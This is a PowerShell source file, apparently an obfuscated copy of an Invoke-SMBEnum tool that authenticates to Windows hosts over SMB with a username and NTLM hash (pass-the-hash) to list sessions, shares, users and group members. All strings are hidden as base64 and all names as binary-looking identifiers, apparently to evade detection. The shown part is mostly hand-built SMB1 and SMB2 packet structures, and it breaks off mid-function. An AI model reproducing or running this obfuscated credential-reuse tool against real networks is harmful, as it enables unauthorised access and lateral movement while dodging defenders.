function Invoke-SMBEnum
{
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$false)][String]$Target,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][ValidateSet("All","NetSession","Share","User","Group")][String]$Action = "All",
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][String]$Group = "Administrators",
    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(Mandatory=$false)][Switch]$TargetShow,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(Mandatory=$false)][Int]$Sleep=150
)
if($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))) -and !$Target)
{
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABUAGEAcgBnAGUAdAAgAGkAcwAgAHIAZQBxAHUAaQByAGUAZAAgAHcAaABlAG4AIABuAG8AdAAgAHUAcwBpAG4AZwAgAC0AUwBlAHMAcwBpAG8AbgA=')))
    throw
}
if($Version -eq '1')
{
    ${01101100100011101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA=')))
}
elseif($Version -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAuADEA'))))
{
    ${01101100100011101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgAuADEA')))
}
if($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaAA='))) -and $PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))))
{
    ${00010100111010000} = $true
}
function _00010011110111111
{
    param(${_01101110001011001})
    ForEach(${00100001100111011} in ${_01101110001011001}.Values)
    {
        ${00010000010111100} += ${00100001100111011}
    }
    return ${00010000010111100}
}
function _10110111001100010
{
    param([Int]${_00001001110111001},[Int]${_00111111110110111})
    [Byte[]]${_01100001010000011} = ([System.BitConverter]::GetBytes(${_00001001110111001} + ${_00111111110110111}))[2..0]
    ${00110100010111000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00110100010111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBUAHkAcABlAA=='))),[Byte[]](0x00))
    ${00110100010111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),${_01100001010000011})
    return ${00110100010111000}
}
function _00110110101011001
{
    param([Byte[]]${_01100000010100101},[Byte[]]${_00001100100101101},[Byte[]]${_01000010011110001},[Byte[]]${_00001101010010010},[Byte[]]${_10110101010011101},[Byte[]]${_10110010100111011})
    ${_10110101010011101} = ${_10110101010011101}[0,1]
    ${10101010001110000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdABvAGMAbwBsAA=='))),[Byte[]](0xff,0x53,0x4d,0x42))
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))),${_01100000010100101})
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAEMAbABhAHMAcwA='))),[Byte[]](0x00))
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00))
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAEMAbwBkAGUA'))),[Byte[]](0x00,0x00))
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),${_00001100100101101})
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA'))),${_01000010011110001})
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQASABpAGcAaAA='))),[Byte[]](0x00,0x00))
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00))
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBJAEQA'))),${_00001101010010010})
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))),${_10110101010011101})
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAEQA'))),${_10110010100111011})
    ${10101010001110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB1AGwAdABpAHAAbABlAHgASQBEAA=='))),[Byte[]](0x00,0x00))
    return ${10101010001110000}
}
function _01010111010111001
{
    param([String]$Version)
    if($Version -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
    {
        [Byte[]]${00000100110011001} = 0x0c,0x00
    }
    else
    {
        [Byte[]]${00000100110011001} = 0x22,0x00  
    }
    ${00111100100110000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00111100100110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x00))
    ${00111100100110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),${00000100110011001})
    ${00111100100110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAEIAdQBmAGYAZQByAEYAbwByAG0AYQB0AA=='))),[Byte[]](0x02))
    ${00111100100110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAE4AYQBtAGUA'))),[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))
    if($version -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
    {
        ${00111100100110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAEIAdQBmAGYAZQByAEYAbwByAG0AYQB0ADIA'))),[Byte[]](0x02))
        ${00111100100110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAE4AYQBtAGUAMgA='))),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        ${00111100100110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAEIAdQBmAGYAZQByAEYAbwByAG0AYQB0ADMA'))),[Byte[]](0x02))
        ${00111100100110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAE4AYQBtAGUAMwA='))),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }
    return ${00111100100110000}
}
function _01001011110100100
{
    param([Byte[]]${_10011011010111111})
    [Byte[]]${00000100110011001} = [System.BitConverter]::GetBytes(${_10011011010111111}.Length)[0,1]
    [Byte[]]${00100011000001101} = [System.BitConverter]::GetBytes(${_10011011010111111}.Length + 5)[0,1]
    ${00110101101101101} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x0c))
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABDAG8AbQBtAGEAbgBkAA=='))),[Byte[]](0xff))
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00))
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00))
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAQgB1AGYAZgBlAHIA'))),[Byte[]](0xff,0xff))
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgATQBwAHgAQwBvAHUAbgB0AA=='))),[Byte[]](0x02,0x00))
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBDAE4AdQBtAGIAZQByAA=='))),[Byte[]](0x01,0x00))
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBLAGUAeQA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAbABvAGIATABlAG4AZwB0AGgA'))),${00000100110011001})
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAHAAYQBiAGkAbABpAHQAaQBlAHMA'))),[Byte[]](0x44,0x00,0x00,0x80))
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),${00100011000001101})
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAbABvAGIA'))),${_10011011010111111})
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUATwBTAA=='))),[Byte[]](0x00,0x00,0x00))
    ${00110101101101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUATABBAE4ATQBhAG4AYQBnAGUA'))),[Byte[]](0x00,0x00))
    return ${00110101101101101} 
}
function _01000000010000001
{
    param([Byte[]]${_01100000010100101},[Byte[]]${_01011110000001001},[Bool]${_00010111000100110},[Int]${_10010000011000001},[Byte[]]${_10110101010011101},[Byte[]]${_00001101010010010},[Byte[]]${_00111001101011110})
    if(${_00010111000100110})
    {
        ${_00001100100101101} = 0x08,0x00,0x00,0x00      
    }
    else
    {
        ${_00001100100101101} = 0x00,0x00,0x00,0x00
    }
    [Byte[]]${01000100011101010} = [System.BitConverter]::GetBytes(${_10010000011000001})
    if(${01000100011101010}.Length -eq 4)
    {
        ${01000100011101010} += 0x00,0x00,0x00,0x00
    }
    ${01111010101100001} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdABvAGMAbwBsAEkARAA='))),[Byte[]](0xfe,0x53,0x4d,0x42))
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x40,0x00))
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABpAHQAQwBoAGEAcgBnAGUA'))),[Byte[]](0x01,0x00))
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbABTAGUAcQB1AGUAbgBjAGUA'))),[Byte[]](0x00,0x00))
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))),${_01100000010100101})
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABpAHQAUgBlAHEAdQBlAHMAdAA='))),${_01011110000001001})
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),${_00001100100101101})
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHgAdABDAG8AbQBtAGEAbgBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBJAEQA'))),${01000100011101010})
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))),${_10110101010011101})
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBJAEQA'))),${_00001101010010010})
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAEQA'))),${_00111001101011110})
    ${01111010101100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    return ${01111010101100001}
}
function _00000011100001111
{
    ${00111100000111001} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00111100000111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x24,0x00))
    ${00111100000111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbABlAGMAdABDAG8AdQBuAHQA'))),[Byte[]](0x02,0x00))
    ${00111100000111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AbwBkAGUA'))),[Byte[]](0x01,0x00))
    ${00111100000111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${00111100000111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAHAAYQBiAGkAbABpAHQAaQBlAHMA'))),[Byte[]](0x40,0x00,0x00,0x00))
    ${00111100000111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGkAZQBuAHQARwBVAEkARAA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${00111100000111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAQwBvAG4AdABlAHgAdABPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00111100000111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAQwBvAG4AdABlAHgAdABDAG8AdQBuAHQA'))),[Byte[]](0x00,0x00))
    ${00111100000111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00))
    ${00111100000111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbABlAGMAdAA='))),[Byte[]](0x02,0x02))
    ${00111100000111001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbABlAGMAdAAyAA=='))),[Byte[]](0x10,0x02))
    return ${00111100000111001}
}
function _00111001011111001
{
    param([Byte[]]${_10011011010111111})
    [Byte[]]${00011111001111110} = ([System.BitConverter]::GetBytes(${_10011011010111111}.Length))[0,1]
    ${01100010010001101} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01100010010001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x19,0x00))
    ${01100010010001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00))
    ${01100010010001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AbwBkAGUA'))),[Byte[]](0x01))
    ${01100010010001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAHAAYQBiAGkAbABpAHQAaQBlAHMA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01100010010001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01100010010001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAdQBmAGYAZQByAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x58,0x00))
    ${01100010010001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAdQBmAGYAZQByAEwAZQBuAGcAdABoAA=='))),${00011111001111110})
    ${01100010010001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAdgBpAG8AdQBzAFMAZQBzAHMAaQBvAG4ASQBEAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${01100010010001101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${_10011011010111111})
    return ${01100010010001101} 
}
function _10101111000101000
{
    param([Byte[]]${_01111101101010010})
    [Byte[]]${10101001101000111} = ([System.BitConverter]::GetBytes(${_01111101101010010}.Length))[0,1]
    ${01101111011011001} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01101111011011001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x09,0x00))
    ${01101111011011001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${01101111011011001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaABPAGYAZgBzAGUAdAA='))),[Byte[]](0x48,0x00))
    ${01101111011011001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaABMAGUAbgBnAHQAaAA='))),${10101001101000111})
    ${01101111011011001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${_01111101101010010})
    return ${01101111011011001}
}
function _10000110011000110
{
    param([Byte[]]${_00110101111101011})
    ${10011111001100010} = ([System.BitConverter]::GetBytes(${_00110101111101011}.Length))[0,1]
    ${01100001011001000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x39,0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQATwBwAGwAbwBjAGsATABlAHYAZQBsAA=='))),[Byte[]](0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA='))),[Byte[]](0x02,0x00,0x00,0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAQwByAGUAYQB0AGUARgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAaQByAGUAZABBAGMAYwBlAHMAcwA='))),[Byte[]](0x03,0x00,0x00,0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAHQAdAByAGkAYgB1AHQAZQBzAA=='))),[Byte[]](0x80,0x00,0x00,0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAEEAYwBjAGUAcwBzAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUARABpAHMAcABvAHMAaQB0AGkAbwBuAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUATwBwAHQAaQBvAG4AcwA='))),[Byte[]](0x40,0x00,0x00,0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQBPAGYAZgBzAGUAdAA='))),[Byte[]](0x78,0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQBMAGUAbgBnAHQAaAA='))),${10011111001100010})
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAQwBvAG4AdABlAHgAdABzAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAQwBvAG4AdABlAHgAdABzAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01100001011001000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${_00110101111101011})
    return ${01100001011001000}
}
function _10000101100001110
{
    param ([Byte[]]${_10100101101001001},[Byte[]]${_10100000101001100},[Byte[]]${_10010100100010100},[Byte[]]${_00110101101110010},[Byte[]]${_01011011101000101},[Int]${_01111101101010010})
    [Byte[]]${00010100001010000} = ,0x00 * ${_01111101101010010}
    ${00110100001100000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00110100001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x29,0x00))
    ${00110100001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGYAbwBUAHkAcABlAA=='))),${_10100101101001001})
    ${00110100001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAG4AZgBvAEMAbABhAHMAcwA='))),${_10100000101001100})
    ${00110100001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAQgB1AGYAZgBlAHIATABlAG4AZwB0AGgA'))),${_10010100100010100})
    ${00110100001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AEIAdQBmAGYAZQByAE8AZgBmAHMAZQB0AA=='))),${_00110101101110010})
    ${00110100001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${00110100001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AEIAdQBmAGYAZQByAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00110100001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAaQB0AGkAbwBuAGEAbABJAG4AZgBvAHIAbQBhAHQAaQBvAG4A'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00110100001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00110100001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_01011011101000101})
    if(${_01111101101010010} -gt 0)
    {
        ${00110100001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${00010100001010000})
    }
    return ${00110100001100000}
}
function _01011011010110110
{
    param ([Byte[]]${_01011011101000101})
    ${10000110000011010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10000110000011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x31,0x00))
    ${10000110000011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGQAZABpAG4AZwA='))),[Byte[]](0x50))
    ${10000110000011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00))
    ${10000110000011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),[Byte[]](0x00,0x00,0x10,0x00))
    ${10000110000011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${10000110000011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_01011011101000101})
    ${10000110000011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AaQBtAHUAbQBDAG8AdQBuAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000110000011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000110000011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AYQBpAG4AaQBuAGcAQgB5AHQAZQBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10000110000011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAGgAYQBuAG4AZQBsAEkAbgBmAG8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00))
    ${10000110000011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAGgAYQBuAG4AZQBsAEkAbgBmAG8ATABlAG4AZwB0AGgA'))),[Byte[]](0x00,0x00))
    ${10000110000011010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),[Byte[]](0x30))
    return ${10000110000011010}
}
function _01010000000010000
{
    param([Byte[]]${_01011011101000101},[Int]${_10010110000110111})
    [Byte[]]${01111011000111101} = [System.BitConverter]::GetBytes(${_10010110000110111})
    ${10010110001101111} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10010110001101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x31,0x00))
    ${10010110001101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBPAGYAZgBzAGUAdAA='))),[Byte[]](0x70,0x00))
    ${10010110001101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),${01111011000111101})
